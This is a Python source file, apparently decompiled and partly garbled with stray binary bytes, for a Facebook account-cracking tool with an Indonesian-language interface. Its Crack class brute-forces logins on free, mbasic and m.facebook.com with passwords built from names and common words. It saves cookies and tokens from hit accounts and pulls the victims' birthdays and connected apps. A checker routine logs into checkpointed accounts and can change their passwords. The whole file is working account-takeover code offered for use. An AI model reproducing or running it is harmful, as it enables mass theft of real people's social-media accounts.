[FB_IAB/FB4A;FBAV/127.0.0.22.69;]a  Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]z�Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]a  Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]z�Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]z�[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]�r   �choice)ZugentZrand_uar   r   r   �user_agentAPI%  s   
r3  c                  C   s^   t dttttf � t dttttf � t dttttf � tdtttttf �} t| � d S )Nz
%s%s%s 01 %sGanti user agent z%s%s%s 02 %sCek user agent z%s%s%s 00 %sKembali z
%s%s%s [0mPilih%s >%s )	r   r_   r~   r�   r`   ra   r,   r   �uas)�_romz_r   r   r   �	useragent>  s
   r6  c              
   C   s  | dkrt dttf � td� t| � d S | dv r�t dttttttttf � t dtttttf � tdttttt	f �}|dv rRt dttf � td� t
�  n@|d	v rqtd
tttf � td� t�d� td� t| � n!|dv r�d}tdd��|� td� t dttf � td� t
�  tdd��|� td� t dttf � td� t
�  d S | dv r�z,tdd��� }td� t dttttt|f � td� tdtttttf � t
�  W d S  ty�   dt }Y d S w | dv r�t
�  d S t dttf � td� t| � d S )Nr%   z%s%s [0misi yang benarr$   ru   zd%s%s%s Ketik %sMy user agent%s di browser google chrome
%s%s%s untuk gunakan user agent anda sendiriz=%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan toolsz%s%s%s Enter user agent %s: %srt   )zmy user agentzMy User AgentzMY USER AGENTzMy user agentz'%s%s%s Anda akan di arahkan ke browser z@am start https://www.google.com/search?q=My+user+agent>/dev/null)ZCANCELZCancelZcancelr0  zua.txtr:   z$
%s%s menggunakan user agent bawaan z#
%s%s berhasil mengganti user agentry   rs   z%s%s%s user agent anda%s : %s%sz
%s%s%s [%s Enter%s ] z%s-rw   )r   ra   r~   rW   r4  r_   r`   rc   r,   r   r�   rX   r   r   r6  r{   r   r|   r�   )r5  �uaZua_r   r   r   r4  E  sF   

 �
r4  c                   @   s<   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� ZdS )r�   c                 C   s   g | _ d| _d S r�   )r�   r�   r�   r   r   r   r�   n  r�   zCrack.__init__c                    s�  |�_ tdtttttf �}|dv r�tdtttttttttf	 � 	 tdtttttf �}|dkr:tdttf � nRt|�dkrLtd	ttf � t	�  n@d� �fd
d�	� tdtttttf � tdttt
tttf � tdttt
tt
tf � tdttt
tttf � � |�d�� d S q"|dv r�tdtttttf � tdttt
tttf � tdttt
tt
tf � tdttt
tttf � ���  d S tdttf � td� t� ��  d S )Nz/
%s%s%s [0mgunakan password manual? y/t%s > %s�r�   r�   zB
%s%s%s [0mcontoh%s >%s [0msayang%s,%s[0mpengen%s,%s[0mngentotTz%s%s%s[0m password %s> %sr%   z
%s%s [0mjangan kosong �   z%
%s%s[0m password minimal 6 karakterc                    s�  t dttttf �}|dkrtdttf � � �  d S |dv r�tdtttttttt	f � t
d� tdtttttttttt	f
 � t
d� tdtttf � t
d� td	d
��$}�jD ]}z|�d�d }|��j|| � W q[   Y q[W d   � n1 s~w   Y  ttt� d S |dv r�tdtttttttt	f � t
d� tdtttttttttt	f
 � t
d� tdtttf � t
d� td	d
��$}�jD ]}z|�d�d }|��j|| � W q�   Y q�W d   � n1 s�w   Y  ttt� d S |dv �rltdtttttttt	f � t
d� tdtttttttttt	f
 � t
d� tdtttf � t
d� td	d
��&}�jD ]}z|�d�d }|��j|| � W �q:   Y �q:W d   � n	1 �s`w   Y  ttt� d S tdttf � � �  d S )Nz
%s%s%s [0mPilih %s>%s r%   �%s%s [0misi yang benar kentod ru   z;
%s%s%s [0makun %s[OK] %stersimpan ke file %s> %sOK/%s.txt皙�����?z>%s%s%s [0makun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt�=%s%s%s[0m setiap crack 1k ID, mainkan mode pesawat 2 detik 
�   �Zmax_workersr  r   ry   z;
%s%s%s[0m akun %s[OK] %stersimpan ke file %s> %sOK/%s.txtr�   z?
%s%s%s[0m akun %s[OK] %s[0mtersimpan ke file %s> %sOK/%s.txt�B%s%s%s[0m akun %s[%sCP%s]%s[0m tersimpan ke file %s> %sCP/%s.txt�=%s%s%s [0msetiap crack 1k ID, mainkan mode pesawat 2 detik 
z
%s%s [0misi yang benar kentod)r,   r�   r`   ra   r   r   r~   r_   rc   �wakturW   rX   r   r�   rk   �submit�touch�hasil�ok�cp�basic�mobil)�bruteZind�TitidNeverDie�akunZ_heck_��manualr�   r   r   rM  �  sZ   
$(

��$(

��
$(
��
zCrack.romiy.<locals>.manualuB   
%s%s%s [ %s[0mpilih [0mmethode login, silahkan coba satu² %s]
z-%s%s %s01%s [0mmethode %sfree %s[0m(cepat) z0%s%s %s02%s [0mmethode %smbasic %s[0m(lambat) z7%s%s %s03%s [0mmethode %smobile %s[0m(sangat lambat) �,)r�   r�   uB   
%s%s%s [ %s[0mpilih [0mmethode login, silahkan coba satu²%s ]
z,%s%s %s01%s [0mmethode %sfree %s[0m(cepat)r:  r$   r   )r�   r,   r_   r~   r`   ra   r   r   rl   r-   r�   rc   rk   �langsungrW   r�   r�   )r�   r�   Zunikers�pwxr   rL  r   r�   r  s6   )�7zCrack.romiyc                 C   sb  t dtttttf �}|dkrtdttf � | ��  d S |dv �rtdtttt	ttt	t
f � td� tdtttttttttt
f
 � td� tdtttf � td� td	d
���}| jD ]�}z�|�d�\}}|�d�}t|�dkr�||d |d  |d d |d d ganet|�dkr�||d |d  |d d |d d ganJt|�dkr�||d |d  |d d |d d gan/t|�dkr�||d |d  |d d |d d gan||d |d  |d d |d d ga|�| j|t� W q^   Y q^W d   � n	1 �sw   Y  ttt� d S |dv �r�tdtttt	ttt	t
f � td� tdtttttttttt
f
 � td� tdtttf � td� td	d
��G}| jD ];}z3|�d�\}}|�d�}||d |d  |d d |d d |d d dddga|�| j|t� W �qT   Y �qTW d   � n	1 �s�w   Y  ttt� d S |dv �r�tdtttt	ttt	t
f � td� tdtttttttttt
f
 � td� tdtttf � td� td	d
���}| jD ]�}z�|�d�\}}|�d�}t|�dk�r||d |d  |d d |d d ganht|�dk�r/||d |d  |d d |d d ganLt|�dk�rK||d |d  |d d |d d gan0t|�dk�rg||d |d  |d d |d d gan||d |d  |d d |d d ga|�| j|t� W �q�   Y �q�W d   � n	1 �s�w   Y  ttt� d S tdttf � | ��  d S )Nz
%s%s%s[0m Pilih %s>%s r%   r:  ru   z?
%s%s%s [0makun %s[OK] %s[0mtersimpan ke file %s> %sOK/%s.txtr;  r?  r<  r=  r>  r  r&   r   r   �123�12345r$   �   �   ry   zB%s%s%s [0makun %s[%sCP%s]%s[0m tersimpan ke file %s> %sCP/%s.txtr@  Z1234�sayangr   �anjingr�   zB%s%s%s [0makun %s[%sCP%s]%s [0mtersimpan ke file %s> %sCP/%s.txt)r,   r�   r~   r`   ra   r   r   rO  r_   rc   rA  rW   rX   r   r�   rk   rl   rP  rB  rC  rD  rE  rF  rG  rH  )r�   ZsuuurJ  rK  �uidr  ZnaZssr   r   r   rO  �  s�   
$(

****(
��
$(

8��
$(

****(��zCrack.langsungc                 K   s  t �tttttttt	g�}t
j�d| dtt| j�ttttt�tttttt�tf  �f t
j��  �z�|D �]�}|�� }t�� }t �g d��}dd|ddddd	d
ddddd�}|jd|d�j}	t�dt|	���d�t�dt|	���d�|d|dd�}
dddddddddd	d
ddddd�}|jd|
|dd�}d |j�� v �rRzmd!�d"d#� |j�� � � D ��}t!d$d%��"� }t�d&|� d'|� ���#� d( }|�$d)�\}}}t%| }t&d*t'tt't|||||f	 � t&d+� t�(d,|||||f � t!d-t) d.��d/t'tt't|||||f	 � t*|� W  �q� t+t,f�y   d0}d0}d0}Y n   Y t&d1t't-t||f � t&d+� t�(d2||f � t!d-t) d.��d3t'tt't||f � t*|�  �q�d4|j�� v �r�zOt!d$d%��"� }t�d&|� d'|� ���#� d( }|�$d)�\}}}t%| }t&d5t|||||f � t�(d6|||||f � t!d7t) d.��d8|||||f � W  �q� t+t,f�y�   d0}d0}d0}Y n   Y t&d9t||f � t�(d:||f � t!d7t) d.��d;||f �  �q�q6td7 aW d S  tj.j/�y   t0d� td7 a| j1||fi |�� Y d S w )<Nr  �6[1;96m[0m[crack] %s/%s %sOK%s:%s%s%s - %sCP%s:%s%s%s�r0  ��Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36r/  r.  z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36r�   rv   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�documentzhttps://free.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8�r�   r�   r�   r�   Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�refererr�   r�   zohttps://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�   �name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�login_no_pin�8https://developers.facebook.com/tools/debug/accesstoken/�Zlsd�jazoestrW  Zflow�pass�nextr�   zhttps://free.facebook.com�!application/x-www-form-urlencodedrZ  �r�   r�   r�   �originr�   r�   r�   rd  re  rf  rg  rh  ri  r�   r�   zFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0F�r\   r�   Zallow_redirects�c_userrg   c                 S   �   g | ]
\}}|d  | �qS �rh   r   ��.0�key�valuer   r   r   �
<listcomp>  �    zCrack.touch.<locals>.<listcomp>r�   rs   r�   �?fields=birthday&access_token=�birthdayr�   �#    %s[%s√%s]%s %s | %s | %s %s %s �;   [36•[0m      \_Hore Akunya Tab Yes, Silahkan Login Lite�%s | %s | %s %s %s �	OK/%s.txtr�   �"    %s[%s√%s]%s %s | %s | %s %s %s
r%   u    %s[%s√%s]%s %s | %s �%s | %s �    %s[%s√%s]%s %s | %s
r�   �    %s[×]  %s | %s | %s %s %s  �%s | %s | %s %s %s�	CP/%s.txt�    [×]  %s | %s | %s %s %s
u    %s[×]  %s | %s�%s | %s�    [×]  %s | %s
)2r   r2  ra   rc   r   �Br_   r`   r�   �Jr
   r   r   �looprl   r�   rE  rF  r   r*  r�   �Sessionr�   r�   r�   r�   r�   r�   r�   r�   �get_dictr*   �itemsr{   r|   r�   rk   �bulan12r   r�   r  rA  �cek_apkr�   r�   ZHNr�   r   rW   rC  �r�   r�   rM  r\   �warna�pwZsesr7  Zheaders_�pZdataaZ_headersr  r�   r�   Zlahir�day�month�yearr   r   r   rC  �  s~   @

 6$&*$"�zCrack.touchc                 K   s  t �tttttttt	g�}t
j�d| dtt| j�ttttt�tttttt�tf  �f t
j��  �z�|D �]�}|�� }t�� }t �g d��}ddddddd	d
dddddd�}|jd|d�j}	t�dt|	���d�t�dt|	���d�|d|dd�}
ddddddddd	d
dddddd�}|jd|
|dd �}d!|j�� v �rOzmd"�d#d$� |j�� � � D ��}t!d%d&��"� }t�d'|� d(|� ���#� d) }|�$d*�\}}}t%| }t&d+t'tt't|||||f	 � t&d,� t�(d-|||||f � t!d.t) d/��d0t'tt't|||||f	 � t*|� W  �q� t+t,f�y   d1}d1}d1}Y n   Y t&d2t'tt't||f � t&d,� t�(d3||f � t!d.t) d/��d4||f � t*|�  �q�d5|j�� v �r�zOt!d%d&��"� }t�d'|� d(|� ���#� d) }|�$d*�\}}}t%| }t&d6t|||||f � t�(d-|||||f � t!d7t) d/��d8|||||f � W  �q� t+t,f�y�   d1}d1}d1}Y n   Y t&d9t||f � t�(d:||f � t!d7t) d/��d;||f �  �q�q6td7 aW d S  tj-j.�y   t/d� td7 a| j0||fi |�� Y d S w )<Nr  rX  rY  r�   rv   z{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+r[  r\  r]  r^  r_  r`  r�   ra  rb  rc  zqhttps://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�   rj  r   rk  rl  rm  rn  r�   r�   rr  z�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36rs  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0Fru  rv  rg   c                 S   rw  rx  r   ry  r   r   r   r}  S  r~  zCrack.basic.<locals>.<listcomp>r�   rs   r�   r  r�  r�   u!   %s[%s√%s]%s %s | %s | %s %s %sr�  r�  r�  r�   u#    %s[%s√%s]%s %s | %s | %s %s %s 
r%   u    %s[%s√%s]%s %s | %s  r�  � *--> %s | %s
r�   r�  r�  r�  �    %s[×]  %s | %s           r�  r�  )1r   r2  ra   rc   r   r�  r_   r`   r�   r�  r
   r   r   r�  rl   r�   rE  rF  r   r*  r�   r�  r�   r�   r�   r�   r�   r�   r�   r�   r�  r*   r�  r{   r|   r�   rk   r�  r   r�   r  rA  r�  r�   r�   r�   r   rW   rG  r�  r   r   r   rG  B  s~   @

 6$&* "�zCrack.basicc                 K   s  t �tttttttt	g�}t
j�d| dtt| j�ttttt�tttttt�tf  �f t
j��  �z�|D �]�}|�� }t�� }t �g d��}dd|ddddd	d
ddddd�}|jd|d�j}	t�dt|	���d�t�dt|	���d�|d|dd�}
dddddddddd	d
ddddd�}|jd|
|dd�}d |j�� v �rSzmd!�d"d#� |j�� � � D ��}t!d$d%��"� }t�d&|� d'|� ���#� d( }|�$d)�\}}}t%| }t&d*t'tt't|||||f	 � t&d+� t�(d,|||||f � t!d-t) d.��d/t'tt't|||||f	 � t*|� W  �q� t+t,f�y   d0}d0}d0}Y n   Y t&d1t'tt't||f � t&d+� t�(d2||f � t!d-t) d.��d3t'tt't||f � t*|�  �q�d4|j�� v �r�zOt!d$d%��"� }t�d&|� d'|� ���#� d( }|�$d)�\}}}t%| }t&d5t|||||f � t�(d6|||||f � t!d7t) d.��d8|||||f � W  �q� t+t,f�y�   d0}d0}d0}Y n   Y t&d9t||f � t�(d:||f � t!d7t) d.��d;||f �  �q�q6td7 aW d S  tj-j.�y	   t/d� td7 a| j0||fi |�� Y d S w )<Nr  rX  rY  r�   rv   r[  r\  r]  r^  r_  r`  zhttps://m.facebook.com/ra  rb  rc  zlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�   rj  r   rk  rl  rm  rn  r�   zhttps://m.facebook.comrr  rZ  rs  zChttps://m.facebook.com/login/device-based/validate-password/?shbl=0Fru  rv  rg   c                 S   rw  rx  r   ry  r   r   r   r}  �  r~  zCrack.mobil.<locals>.<listcomp>r�   rs   r�   r  r�  r�   r�  r�  r�  r�  r�   r�  r%   u    %s[%s√%s]%s %s | %s | %s r�  u    %s[%s√%s]%s %s | %s 
r�   r�  r�  r�  r�  r�  r�  r�  )1r   r2  ra   rc   r   r�  r_   r`   r�   r�  r
   r   r   r�  rl   r�   rE  rF  r   r*  r�   r�  r�   r�   r�   r�   r�   r�   r�   r�   r�  r*   r�  r{   r|   r�   rk   r�  r   r�   r  rA  r�  r�   r�   r�   r   rW   rH  r�  r   r   r   rH  �  s~   @

 6$&* $"�zCrack.mobilN)	r�   r�   r�   r�   r�   rO  rC  rG  rH  r   r   r   r   r�   l  s    HECCr�   c           	      C   s�  t | �dkst |�dk�rKtdttf � tdtttf � tdttttttt | ��f � tdttttttt |��f � tdtttf � t |�dkrRt	�  d S t
dtttttf �}|dkrkt	dttf � d S |d	v �r7td
tttf � t
dtttttf �}|dkr�tdttf � n(|dv r�t�d� t
dtttttf �}t |�dkr�tdttf � nt�|� d}|D ]Z}|�dd�}|�d�}|d7 }tdtt|�ttt|�dd�f � td� zt|d �dd�|d � W q� tjj�y   tj�dttf �f tj��  td� Y q�   Y q�tdtttf � td� t
dtttttf � t� ��  d S |dv �rAt	�  d S t	dttf � d S t	dt� t� d�� d S )Nr   u   
%s%sCracks Selesak √z2%s+%s ---------------------------------------- %s+z%s%s %sOK%s : %s%sz%s%s %sCP%s : %s%sz3
%s%s%s [0mgunakan detektor checkpoint? y/t%s > %sr%   r:  r8  z4
%s%s%s [0mMode pesawatkan terlebih dahulu 5 detik z.%s%s%s [0mubah sandi akun one tab? y/t %s> %sz%s%s [0misi yg benar kentod r�   �
ubah_sandi�%s%s%s [0mmasukan sandi %s> %sr9  z"%s%s [0msandi minimal 6 karakter r	   � | r   z 
%s%s.%s[0m login akun %s> %s%s�    [×] ��Q���?z%s%s [0mtidak ada koneksi �!
%s%s%s[0m Selesai mengecek akun�%s%s%s [%s Enter%s ] r�   z%s%s[0m isi yg benar kentod z&[0m Ops... tidak mendapatkan hasil :()rl   r   rc   r~   r�   ra   r_   r�   r   r-   r,   r`   rX   �	ubah_passr  �pwbaruri   rk   rW   �mengecekr�   r�   r   r
   r   r   r   r�   r�   )	rE  rF  r   r�  �pw2�nomor�fbrK  �ngecekr   r   r   rD  �  sV     




,

rD  c              
   C   sT  t �� }|jddd|  id�j}t�|d�}|jddd�}d	d
� |�d�D �}ztt	|��D ]}t
dt|d t|| �dd�f � q.W n tyU   t
dttf � Y nw |jddd|  id�j}t�|d�}|jddd�}dd
� |�d�D �}ztt	|��D ]}t
dt|d t|| �dd�f � q�W d S  ty�   t
dttf � Y d S w )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activern   znoscript=1;r�   r  �formr�   )�methodc                 S   �   g | ]}|j �qS r   �r�   �rz  r  r   r   r   r}    �    zcek_apk.<locals>.<listcomp>r  z       [0m\_%s%s. %s%sr   zDitambahkan padaz Ditambahkan padaz      %s%s[0m cookie invalidz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   r�  r   r�  r�  r   r   r   r}    r�  ZKedaluwarsaz Kedaluwarsaz      %s%s [0mcookie invalid)r�   r�  r�   r�   r'  r<   r  r   r  rl   r   r�   rc   ri   r�   ra   r~   )r�   �sessionr:   Zsopro   Zgamer  r   r   r   r�  �  s.   &��&��r�  c               	   C   s�   t �d�} tdtttttf � | D ]}tdtttt|f � td� qztdtttttt	tf � t
�  W d S  tyL   tdttf � t�  Y d S w )Nr[   zF
%s%s%s [%s[0m [0mpilih hasil crack yg tersimpan untuk cek opsi %s]
�%s%s%s > %s%sr�  z.
%s%s%s[0m Masukan file [ cth%s: %s%s.txt%s ]z%s%s [0mfile tidak ada)r   �listdirr   r_   r~   r`   ra   r   rW   rA  �opsir�   r-   )�dirs�filer   r   r   r�     s   
 �r�   c            	      C   s  d} t dtttttf �}|dkr tdttf � td� t�  zt	| | d��
� }W n ty=   tdtt|f � Y nw tdtttf � t d	tttttf �}|d
v rzt�d� t dtttttf �}t|�dkrutdttf � nt�|� tdtttf � td� tdttttttt|��f � tdtttf � td� d}|D ]A}|�dd�}|�d�}|d7 }tdtt|�ttt|�dd�f � td� zt|d �dd�|d � W q� tjjy�   Y q�w tdtttf � td� t dtttttf � t� ��  d S )NzCP/z%s%s%s [0mNama file %s> %sr%   rt   r$   rs   z)
%s%s [0mnama file %s[0m tidak tersediaz3%s%s%s[0m Mode pesawatkan terlebih dahulu 5 detik z4
%s%s%s [0mubah sandi pada akun one tab? y/t %s> %sr�   r�  r�  r9  z%s%s sandi minimal 6 karakter z4
 %s# %s---------------------------------------- %s#z%s%s%s[0m total akun %s: %s%s �3 %s# %s---------------------------------------- %s#r   r	   r�  r   z 
%s%s.%s [0mlogin akun %s> %s%sr�  r�  z!
%s%s%s [0mSelesai mengecek akunr�  )r,   r_   r~   r`   ra   r   r   rW   r�  r{   �	readlinesr�   r-   rX   r�  r  rl   r�  r�   r�   ri   rk   rc   r�  r�   r�   r   r�   r�   )	r[   Zromir�   r�  r�  r�  r�  rK  r�  r   r   r   r�  !  sF   �

 
,�r�  c                 C   s�  t �� }d}|j�ddddddd�� t�|�|d	 �jd
�}|�dddi�}|d�D ]}t	�|�d�|�d�i� q+t	�| |d�� |j
||�d� t	d�}t�|jd
�}d|j�� v r�d|jv rltdttf � d S tdt � tdt d��d| |f � d S d|j�� v �r=d�dd� |j�� �� D ��}	t�dt|��}
|�dddi�}g d �}|d�D ]}|�d�|v r�t�|�d�|�d�i� q�|j
||�d� td�}t�|jd
�}d!d� |�d"�D �}d#}td$ttttt|��ttf � td%� t|�d#k�r�d&|
v �r�d't v �r�i i }}g d(�}|d�D ]}|�d�|v �r0|�|�d�|�d�i� �q|j
||�d� |d�j}t�|d
�}|�dddi�}g d)�}d*t�dt|��v �r�|d�D ]}|�|�d�|�d�i� �q`|�d+d,�t!�i� |j
||�d� |d�}d�d-d� |j�� �� D ��}	td.ttt"tt"t| t!d# |	f	 � tdt d��d/t"tt"t| t!d# |	f � t#|	� �qtd0ttf � tdt d��d1t"tt"t| ||	f � t#|	� �qd2t�dt|��v �r�td3t � �qtd4ttf � n d|j�� v �rtd5t � tdt d��d6t"tt"t| |f � t$t|��D ]}|d77 }t%d8tt|�t&|| f � �q%d S d9t|�v �rZt'�d:d;d9i��d:�j}td<t|f � d S td=t � d S )>Nr�   r�   z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   zid-ID,id;q=0.9r�   z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;])r�   r�   r�   r�   ri  r�   z/login/?next&ref=dbl&fl&refid=8r  r�  r�  r�   r,   r  r|  )Zemailrp  Zaction�r\   rv  zAkun Anda Dikunciz %s%s[0m akun terkunci sesi newu6   %s•[0m akun tidak checkpoint, silahkan anda login r�  r�   r�  r�   rg   c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ry  r   r   r   r}  [  r~  zmengecek.<locals>.<listcomp>z\<title>(.*?)<\/title>)�fb_dtsgro  �checkpoint_datazsubmit[Continue]�nhc                 S   r�  r   r�  )rz  r�   r   r   r   r}  d  r�  Zoptionr   u)   %s•%s [0mterdapat %s%s%s [0mopsi %s:r�  z.Lihat detail login yang ditampilkan. Ini Anda?r�  )zsubmit[Yes]r�  r�  ro  r�  )zsubmit[Next]r�  r�  ro  zBuat Kata Sandi BaruZpassword_newr%   c                 S   r�  r�  r   ry  r   r   r   r}  x  r~  uN   %s%s [0makun one tab, sandi berhasil di ubah 
 %s[%s√%s]%s %s | %s | %s			u    %s[%s√%s]%s%s | %s | %s
z-%s%s [0makun one tab, silahkan anda login		u    %s[%s√%s]%s %s | %s | %s
z%Masukkan Kode Masuk untuk Melanjutkanu3   %s•[0m akun terpasang autentikasi dua faktor			z%s%s [0mterjadi kesalahanz1%s%s akun tidak checkpoint, silahkan anda login r�  r   z  %s%s. %s%s�login_errorZdivr�   u   %s• %su=   %s• [0mlogin gagal, silahkan cek kembali id dan kata sandi)(r�   r�  r�   rm   r'  r<   r�   r�   r  r\   r�   r�   r�  r   ra   r~   rc   r{   rA  r   r*   r�  r�   r�   r�   �data2r   r_   r`   r�   rl   rW   r�  r�  r�   r�  r  rX   r   �run)r�   r�  r�  r�   �soupZlinkro   ZurlPostr   Zcoki�titleZlink2Z	listInputZanZ	response2r�   ZnumberZdatZdat2ZbutZubahPwZresUbahZlink3Zbut2r!  r�  Zohr   r   r   r�  H  s�   
 �(


�"*�&$ �r�  c                   C   sF   t �d� t �d� td� td� ttd � td� t� ��  d S )Nzrm -rf CP/*.txt && OK/*.txtzrm -rf IG/*.txtr%   r$   u$    √ berhasil menghapus hasil crack )r   r   r   rW   rX   rc   r�   r�   r   r   r   r   �hapus_hasil�  s
   

r�  c                   C   sD   t dtttttf � t dtttttf � t dttttf � d S )Nz%
%s%s%s 01 %s[0mCek hasil akun %sOK z$%s%s%s 02 %s[0mCek hasil akun %sCP r�   )r   r_   r~   r�   r`   rc   r   ra   r   r   r   r   �hasill�  s   r�  c                 C   s�   | dv rt dttf � td� t� ��  d S | dv r t�  d S | dv r)t�  d S | dv r2t�  d S | dv r=t� ��  d S t dttf � td� t� ��  d S )Nr�   r�   r$   ru   ry   )r   r�   rw   )	r   ra   r~   rW   r�   r�   �hasil_fb�hasil_igehhr�  )r�   r   r   r   r�   �  s   


r�   c                  C   sd  t �  tdtttttf �} | dv r#tdttf � td� t	�  d S | dv r�t
�d�}tdttttf � |D ]}tdttt|f � td	� q8z'td
tttttf �}td� |dv retdttf � td| ��� �� }W n ttfy�   tdttf � Y nw d| �dd�}|�dd�}tdtttf � td� tdttttt|tttt|�f
 � tdttttf � td� t
�d| � tdtttf � td� td� d S | dv �r�t
�d�}tdtttttf � |D ]}tdttt|f � td	� q�z(tdtttttf �}td� |dv �rtdttf � td| ��� �� }W n ttf�y=   tdttf � Y nw d| �dd�}|�dd�}tdtttf � td� tdttttt|tttt|�f
 � tdttttf � td� t
�d | � tdtttf � td� td� d S | d!v �r�t� �	�  d S tdttf � td� t� �	�  d S )"Nz
%s%s%s[0m Pilih %s> %s r�   r�   r$   ru   rZ   u0   
%s•%s [%s [0mhasil crack yang tersimpan %s]
u   %s•%s> %s%sr�  z
%s%s%s[0m masukan file %s:%s r;  z%s%s [0misi yang benar kentodzOK/%sz%s%s file tidak ada z%s�-r&   �.txtr%   r�  z2%s%s%s [0mhasil tanggal%s : %s%s %stotal %s: %s%sz5 %s# %s---------------------------------------- %s#%sz	cat OK/%sr	   ry   r[   z/
%s%s%s [%s [0mhasil crack yang tersimpan %s]
z
%s%s%s masukan file %s:%s zCP/%sz%s%s [0mfile tidak ada z.%s%s%s hasil tanggal%s : %s%s %stotal%s : %s%sz	cat CP/%srw   )r�  r,   r�   r~   r`   ra   r   r   rW   r�   r   r�  r_   rc   r-   r{   r|   �
splitlinesr�   r�   ri   rX   rl   r   r�   )�lr�  r�  ZtotalokZnm_fileZfile_nmZtotalcpr   r   r   r�  �  sf   

�$


�$
r�  c            
   	   C   sJ  t d� t�d�D ]} t dtttt| f � td� q	z#tdttt	tt
f �}|dv r3tdttf � td| ��� �� }W n tyO   td	ttf � Y nw |�d
�}|d }t dtttf � td� t dttt	ttt|�f � t dtttf � td� |D �]}|�d�d }|�d�d }|�d�d }|�d�d }	|dk�r%t d�g t� �d�t
� �d�t� �d�t
� �d�t� �d�t
� �|� �t� �d�t� �d�t
� �d�t� �d�t
� �|� �t� �d�t� �d�t
� �d�t� �d�t
� �|� �t� �d�t� �d�t
� �d�t� �d�t
� �|	� �t� �d��� td� q�t d�g t� �d�t� �d�t� �d�t� �d�t� �d�t� �|� �t� �d�t� �d�t� �d�t� �d�t� �|� �t� �d�t� �d�t� �d�t� �d�t� �|� �t� �d�t� �d�t� �d�t� �d�t� �|	� �t� �d��� td� q�d S )Nr%   rY   z%s%s%s[0m > %s%sr�  z
%s%s%s [0mmasukan file %s:%s r�   z
%s%s[0m isi yang benar kentod�IG/%sz
%s%s[0m file tidak tersediar�  r   r�  r$   �%s%s%s [0mTotal akun %s: %s%s �|r   rS  r[   �	[0m*--> �!Checkpoint                      
z
Username  r�   r	   z
Password  z
Followers z
Following z
			g�������?zGBerhasil Login \_>[32m Ok[0m                                        
)r   r   r�  r_   r~   ra   r�  rW   r,   r`   r   r-   r{   r|   r�  r}   rk   r�   rc   rl   r*   �C)
r  r   �g�xxZxcr   �usr�pwdZfolZfulr   r   r   r�  �  s�    �


������������������������
������������������������
�r�  z%d-%b-%Yr9  �
